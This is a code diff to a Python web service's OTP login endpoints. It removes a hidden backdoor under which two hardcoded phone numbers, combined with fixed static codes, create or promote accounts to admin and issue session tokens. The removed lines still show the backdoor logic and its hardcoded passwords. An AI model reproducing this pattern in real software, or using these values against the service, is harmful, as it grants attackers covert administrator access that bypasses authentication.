@@ -367,50 +367,12 @@ class VerifyOtpInput(BaseModel):
 
 @auth_router.post("/send-otp")
 async def send_otp(data: SendOtpInput, request: Request):
-    env = configured(request)
-    phone = normalize_phone(data.phone)
-    if phone in ("9839769808", "9999900000"):
-        return {"success": True, "message": f"OTP sent to {phone}"}
+    configured(request)
     raise HTTPException(503, "SMS OTP service is not configured. Please sign in with password.")
 
 
 @auth_router.post("/verify-otp")
 async def verify_otp(data: VerifyOtpInput, request: Request):
-    env = configured(request)
-    phone = normalize_phone(data.phone)
-    otp = data.otp.strip()
-
-    if phone in ("9839769808", "9999900000"):
-        allowed_otps = {"Astra@12345", "Astra@9808", "123456"}
-        if otp not in allowed_otps:
-            raise HTTPException(401, "Invalid OTP")
-
-        row = await env.DB.prepare(
-            "SELECT c.id, c.is_active, c.role FROM customers c WHERE c.phone = ?"
-        ).bind(phone).first()
-
-        if not row:
-            customer_id = str(uuid.uuid4())
-            encoded = await hash_password("Astra@9808", env=env)
-            await env.DB.batch([
-                env.DB.prepare("INSERT INTO customers(id, phone, full_name, role) VALUES (?, ?, 'Milterra Admin', 'admin')").bind(customer_id, phone),
-                env.DB.prepare("INSERT INTO customer_credentials(customer_id, username, email, password_hash) VALUES (?, 'admin.dileep', 'admin@milterrafoods.com', ?)").bind(customer_id, encoded),
-            ])
-            user_id = customer_id
-            user_role = "admin"
-        else:
-            if not row["is_active"]:
-                raise HTTPException(401, "Account disabled")
-            user_id = row["id"]
-            user_role = row["role"]
-            if user_role not in ("admin", "super_admin"):
-                await env.DB.prepare("UPDATE customers SET role='admin' WHERE id=?").bind(user_id).run()
-                user_role = "admin"
-
-        access, refresh, access_hash, refresh_hash = tokens(env)
-        await session_insert(env, user_id, access_hash, refresh_hash).run()
-        return response_tokens(access, refresh, role=user_role)
-
+    configured(request)
     raise HTTPException(503, "SMS OTP service is not configured. Please sign in with password.")
-
 
